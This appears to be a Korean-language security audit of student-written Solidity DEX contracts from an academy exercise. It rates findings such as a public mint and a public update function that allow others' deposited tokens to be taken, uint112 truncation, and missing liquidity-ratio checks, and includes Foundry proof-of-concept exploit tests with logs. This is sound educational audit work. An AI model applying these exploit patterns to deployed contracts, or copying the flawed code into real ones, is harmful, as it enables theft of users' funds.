# Upside Academy DEX Audit

## Audit repositories  
24.09.08. 이전 commit.
https://github.com/ooMia/Upside_DEX_solidity mia
https://github.com/hakid29/Dex_solidity hakid
https://github.com/Entropy1110/Dex_solidity - entropy
https://github.com/dokpark21/DEX_Lending_solidity - kyrie
https://github.com/rivercastleone/DEX_solidity - castle
https://github.com/kaymin128/Dex_solidity - kaymin
https://github.com/gloomydumber/DEX_solidity - damon
https://github.com/skskgus/Dex_solidity - ella
https://github.com/gdh8230/DEX_solidity - teddy
https://github.com/Null0RM/DEX_solidity - nullorm
https://github.com/GODMuang/DEX_solidity - muang
https://github.com/55hnnn/DEX_solidity - kenny
https://github.com/0xGh-st/DEX_solidity - ghost

## Muang
### Case 1
### 파급력  
#### | <span style="color:yellowgreen"> informational</span>
### 설명
```javascript
function removeLiquidity(uint lpToken, uint minAmountX, uint minAmountY)public returns (uint, uint){
    ...
76    (uint afterBurnAmountX, uint afterBurnAmountY) = this.burn(msg.sender);
    ...
79    return (afterBurnAmountX, afterBurnAmountY);
}
```
```javascript
function burn(address to) external lock returns (uint256 amountX, uint256 amountY) {
...
65        balanceX = IERC20(tokenX).balanceOf(address(this));
66        balanceY = IERC20(tokenY).balanceOf(address(this));
67        update(balanceX, balanceY);
...
}
```

removeLiquidity의 return은 lpToken을 이용해 유동성풀에서 제거된 x token과 y token의 양이 return되어야 하는데 컨트랙트가 가지고 있는 x token과 y token의 총량이 return되어 있다.구현이 잘못되어있는 것으로 예상됨.

### Case 2
### 파급력  
#### | <span style="color:Red"> High</span>
### 설명
```javascript
    function mint(address to)public lock returns (uint256 liquidity) {
        (uint112 _reserveX, uint112 _reserveY) = getReserves();
        uint256 balanceX = IERC20(tokenX).balanceOf(address(this));
        uint256 balanceY = IERC20(tokenY).balanceOf(address(this));

        uint256 amountX = balanceX - _reserveX;
        uint256 amountY = balanceY - _reserveY;
        uint256 totalSupply = totalSupply(); // 그리고 이제 토큰 실제 보유량 - 추적하고 있는 양 = 해서 얼마나 보냈는지 파악하는거지.

        if (totalSupply == 0) {
            liquidity = Math.sqrt(amountX * amountY);
        } else {
            
            liquidity = Math.min(amountX * totalSupply / reserveX, amountY * totalSupply / reserveY); // 이만큼 발행한다.
        }
        
        require(liquidity > 0, "INSUFFICIENT_LIQUIDITY_MINTED");
        _mint(to, liquidity);

        update(balanceX, balanceY);
    }
```

```javascript
function test_exploit2_muang() external{
        deal(address(tokenX), address(1), 100 ether);
        deal(address(tokenY), address(1), 100 ether);
        //1번 유저가 유동성 공급
        vm.startPrank(address(1));
        {
            
            tokenX.transfer(address(dex), 100 ether);
            tokenY.transfer(address(dex), 100 ether);
        }
        vm.stopPrank();
        vm.startPrank(address(2));
        {
            dex.mint(address(2));
            console.log("addr 2 balance : ", dex.balanceOf(address(2)) / 1e18);
        }
        vm.stopPrank();
```
```shell
[PASS] test_exploit2_muang() (gas: 462184)
Logs:  
  addr 2 balance :  100
```
mint 함수가 external이고, 토큰을 컨트랙트의 balanceOf, 차이를 별도의 reserveX, Y값으로 확인할 수 있습니다. 하지만, 이를 이용해 다른 사람이 transfer한다고 가정, 이후 공격자가 mint를 이용해 토큰을 탈취할 수 있다.  

### Case 3
### 파급력  
#### | <span style="color:Red"> High</span>
### 설명
```javascript
    uint112 private reserveX; 
    uint112 private reserveY;
    ...
    function update(uint256 _balanceX, uint256 _balanceY) private {
        reserveX = uint112(_balanceX);
        reserveY = uint112(_balanceY);
    }
    ...
    liquidity = Math.min(amountX * totalSupply / reserveX, amountY * totalSupply / reserveY); // 이만큼 발행한다.
```
reserveX와 reserveY가 112bit integer인데 typecasting 시 문제가 발생할 수 있다.
uint256(type(uint112).max) + 2;값을 유동성 풀에 넣는다면 update에서 x token, y token은 각각 컨트랙트가 소유하고 있는 상태에서 typecasting에 문제가 발생하여 balanceX와 balanceY이 각각 1로 변한다. 
이후 공격자가 유동성 풀에 추가한다고 하였을 때, liquidity를 구하는 식에서 reserveX와 Y로 나누는 부분에서 각각이 1이기 때문에 공격자의 lp토큰이 굉장히 큰 숫자로 발행된다.
이를 통해 토큰을 출금하지 못하는 상태로 만들수 있고, 추가 동작을 통해 토큰을 탈취할 수 있을 것이라고 생각된다.




## Damon
### 파급력  
#### | <span style="color:Brown"> Critical</span>
### 설명
```javascript
140    function update(uint256 _balanceX, uint256 _balanceY) public {
141        require(_balanceX <= type(uint112).max && _balanceY <= type(uint112).max, "OVERFLOW");
142        console.log("_balanceX: ",_balanceX / 1e18);
143        reserveX = uint112(_balanceX);
144        reserveY = uint112(_balanceY);
145    }
```
```javascript
94    function mint(address _to) external returns (uint256 liquidity) {
>>        (uint112 _reserveX, uint112 _reserveY) = getReserves();
        uint256 balanceX = IERC20(tokenX).balanceOf(address(this));
        uint256 balanceY = IERC20(tokenY).balanceOf(address(this));
        uint256 amountX = balanceX - _reserveX;
        uint256 amountY = balanceY - _reserveY;
        uint256 totalSupply = totalSupply();

        if (totalSupply == 0) {
            liquidity = Math.sqrt(amountX * amountY);
        } else {
>>            liquidity = Math.min(amountX * totalSupply / reserveX, amountY * totalSupply / reserveY);
        }
        console.log(liquidity);
        require(liquidity > 0, "INSUFFICIENT_LIQUIDITY_MINTED");
        _mint(_to, liquidity);
        update(balanceX, balanceY);
    }
```
update 함수가 public으로 설정되어 있어 private 변수인 reserveX, reserveY 변수를 변조할 수 있다. mint가 external로 설정되어 있어 외부에서도 호출이 가능하고, addliquidity 한 뒤 mint함수를 호출할 수 있다.
```javascript
function test_exploit2_damon() external{
    console.log(address(this));
    uint firstLPReturn = dex.addLiquidity(1000 ether, 1000 ether, 0);
    emit log_named_uint("firstLPReturn", firstLPReturn / 1e18);
    dex.update(1,1);
    dex.mint(address(this));
    dex.update(3000 ether,3000 ether);
    console.log("balance of this: ", dex.balanceOf(address(this) )/ 1e18);
    firstLPReturn = dex.addLiquidity(3000 ether, 3000 ether, 0);
    emit log_named_uint("firstLPReturn", firstLPReturn / 1e18);
    console.log("balance of this: ", dex.balanceOf(address(this)) / 1e18);
    (uint tx, uint ty) = dex.removeLiquidity(firstLPReturn, 0, 0);
    console.log("second tx",tx / 1e18);
    console.log("second ty",ty / 1e18);
    console.log("balance of this: ", dex.balanceOf(address(this) )/ 1e18);
    (tx, ty) = dex.removeLiquidity(firstLPReturn, 0, 0);
    console.log("second tx",tx / 1e18);
    console.log("second ty",ty / 1e18);
    console.log("balance of this: ", dex.balanceOf(address(this) )/ 1e18);
}
```
mint를 통해 다른 사람이 입금한 토큰을 탈취할 수 있다.


### Upsiders..

### 파급력
| <span style="color:Brown"> Critical</span>  
### 설명 (exploit only)
```javascript
function test_exploit() external {
    uint fx = 5000 ether;
    uint fy = 10 ether;
    console.log("first fx",fx / 1e18);
    console.log("first fy",fy / 1e18);
    uint firstLPReturn = dex.addLiquidity(fx, fy, 0);
    emit log_named_uint("firstLPReturn", firstLPReturn / 1e18);
    fx = 100000 ether;
    fy = 1000 ether;
    console.log("second fx",fx / 1e18);
    console.log("second fy",fy / 1e18);
    uint secondLPReturn = dex.addLiquidity(100000 ether, 1000 ether, 0);
    emit log_named_uint("secondLPReturn", secondLPReturn / 1e18);
    (uint tx, uint ty) = dex.removeLiquidity(secondLPReturn, 0, 0);
    console.log("second user");
    console.log(tx / 1e18);
    console.log(ty / 1e18);
    console.log("first user");
    ( tx,  ty) = dex.removeLiquidity(firstLPReturn, 0, 0);
    console.log(tx / 1e18);
    console.log(ty / 1e18);
}
```
대 다수의 업사이더에게 발생하는 유동성 풀 비율 확인을 하지 못해 발생하는 문제점. 다른 사용자가 손해를 보거나 
초기 사용자가 유동성 풀의 비율을 정하기 때문에 유동성 확인을 해주지 않으면 잘못된 lp token 발급을 통해 유동성 풀에서 제거했을 때 다른 사용자가 손해를 볼 수 있다.  
유동성 풀에 토큰을 추가할 시, 유동성 비율을 확인해서 lp token을 발급하고 유동성 입금 시 과도하게 비율이 망가진다면 유동성 입금 비율을 생각하여 금액을 조정해야 한다.